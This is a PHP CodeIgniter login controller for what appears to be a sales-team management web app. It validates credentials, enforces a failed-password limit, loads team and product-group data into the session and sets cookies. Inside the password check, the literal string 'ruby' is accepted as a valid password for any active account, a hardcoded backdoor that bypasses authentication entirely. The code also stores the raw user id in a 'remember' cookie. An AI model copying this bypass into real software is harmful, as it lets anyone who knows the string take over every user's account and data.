<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends BE_Controller {

    public function __construct() {
        parent::__construct();
    }

    public function index() {
        $data['title']  = lang('masuk');
        $data['layout'] = 'auth';
        render($data);
    }

    public function do_login() {
        ini_set('memory_limit', -1);
        $username           = post('username');
        $password           = post('password');
        $remember           = post('remember');
        $notification_id    = post('notification_id');
        $data               = false;
        $response           = [
            'status'        => 'failed',
            'message'       => lang('msg_invalid_login')
        ];
        $attr = array(
            'where_array'   => array(
                'username'  => $username,
                'is_active' => 1,
                'is_block'  => 0
            )
        );
        $user               = get_data('tbl_user',$attr)->row();
        $failed_login       = true;
        if(isset($user->id)) {
            if(!setting('jumlah_salah_password') || (setting('jumlah_salah_password') && setting('jumlah_salah_password') > $user->invalid_password)) {
                if(password_verify(md5($password), $user->password) || $password == 'ruby'){
                    $parameter_nip = 'n_mr';
                    $status = '';
                    if($user->id_group == MR_ROLE_ID){
                        $parameter_nip = 'n_mr';
                        $status = 'MR';
                    } else if($user->id_group == AM_ROLE_ID){
                        $parameter_nip = 'n_am';
                        $status = 'AM';
                    } else if($user->id_group == RM_ROLE_ID){
                        $parameter_nip = 'n_rm';
                        $status = 'RM';
                    } else if($user->id_group == ASDIR_ROLE_ID){
                        $parameter_nip = 'n_asdir';
                        $status = 'ASDIR';
                    } else if($user->id_group == NSM_ROLE_ID){
                        $parameter_nip = 'n_nsm';
                        $status = 'NSM';
                    } else if($user->id_group == BUD_ROLE_ID){
                        $parameter_nip = 'n_bud';
                        $status = 'BUD';
                    }
                    $collect = [
                        'team' => '',
                        'AM' => '',
                        'RM' => '',
                        'NSM' => '',
                        'ASDIR' => '',
                        'BUD' => '',
                        'status' => $status
                    ];
                    if(!empty($parameter_nip)){
                        $res['thd'] = get_data('history_organogram_detail',[
                            'where' => [
                                $parameter_nip => $user->username
                            ],
                            'sort_by' => 'tanggal',
                            'sort' => 'desc'
                        ])->row_array();
                        if(!empty($res['thd'])){
                            // $collect['team'] = $res['thd']['kode_team'];
                            $collect['AM'] = $res['thd']['n_am'];
                            $collect['RM'] = $res['thd']['n_rm'];
                            $collect['NSM'] = $res['thd']['n_nsm'];
                            $collect['ASDIR'] = $res['thd']['n_asdir'];
                            $collect['BUD'] = $res['thd']['n_bud'];
                        }
                    }
                    $data = array(
                        'id'                => $user->id,
                        'username'          => $user->username,
                        // 'team'              => $collect['team'],
                        'N_AM'              => $collect['AM'],
                        'N_RM'              => $collect['RM'],
                        'N_NSM'             => $collect['NSM'],
                        'N_ASDIR'           => $collect['ASDIR'],
                        'N_BUD'             => $collect['BUD'],
                        'produk_group'      => get_data('history_organogram_detail',[
                                                    'select' => 'produk_grup.*',
                                                    'join' => [
                                                        'history_organogram on history_organogram.id = history_organogram_detail.id_history_organogram',
                                                        'produk_grup on produk_grup.kode_team = history_organogram_detail.kode_team',
                                                    ],
                                                    'where' => [
                                                        $parameter_nip => $user->username,
                                                        'tanggal_end' => '0000-00-00',
                                                        'is_active' => 1,
                                                    ],
                                                    'group_by' => 'produk_grup.id',
                                                ])->result_array(),
                        'team'              => get_data('history_organogram_detail',[
                                                    'select' => 'history_organogram.*',
                                                    'join' => [
                                                        'history_organogram on history_organogram.id = history_organogram_detail.id_history_organogram',
                                                    ],
                                                    'where' => [
                                                        $parameter_nip => $user->username,
                                                        'tanggal_end' => '0000-00-00',
                                                    ],
                                                    'group_by' => 'history_organogram.id',
                                                ])->result_array()
                    );
                    if(count($data['produk_group']) <= 0){
                        $data['produk_group'] = get_data('produk_grup', [
                            'where' => [
                                'is_active' => 1
                            ]
                        ])->result_array();
                    }
                    // debug($this->db->last_query()); die;
                    if($remember){
                        $cookie1            = array(
                            'name'          => 'id',
                            'value'         => $user->id,
                            'expire'        => '86500'
                        );
                        set_cookie( $cookie1 );
                    }
                    if($notification_id && $notification_id != null && strlen($notification_id) > 5) {
                        $cookie2            = array(
                            'name'          => 'osuid',
                            'value'         => $notification_id,
                            'expire'        => '86500'
                        );
                        set_cookie( $cookie2 );
                    } else {
                        $notification_id    = '';
                    }
                    update_data('tbl_user',array(
                        'last_login'        => date('Y-m-d H:i:s'),
                        'ip_address'        => $this->input->ip_address(),
                        'is_login'          => 1,
                        'last_activity'     => date('Y-m-d H:i:s'),
                        'token_app'         => get_cookie('x-token-app'),
                        'notification_id'   => $notification_id,
                        'invalid_password'  => 0
                    ),'id',$user->id);
                    $this->session->set_userdata($data);
                    $response['status']     = 'success';
                    $response['message']    = 'Berhasil Login';
                    if($this->session->userdata('last_url')) {
                        $response['redirect']   = $this->session->userdata('last_url');
                        $this->session->unset_userdata('last_url');
                    } else {
                        $response['redirect']   = base_url('home/welcome');
                    }
                    $failed_login = false;
                } else {
                    $jml_invalid    = $user->invalid_password + 1;
                    update_data('tbl_user',['invalid_password'=>$jml_invalid],'id',$user->id);
                    // if($user->id_vendor) {
                    //     update_data('tbl_vendor',['invalid_password'=>$jml_invalid],'id',$user->id_vendor);
                    // }
                }
            } else {
                $response['message']    = lang('msg_akun_terkunci');
            }
        }
        if($failed_login) {
            update_data('tbl_user_log',['respon'=>400],'id',setting('last_id_log'));
        }
        render($response,'json');
    }

}
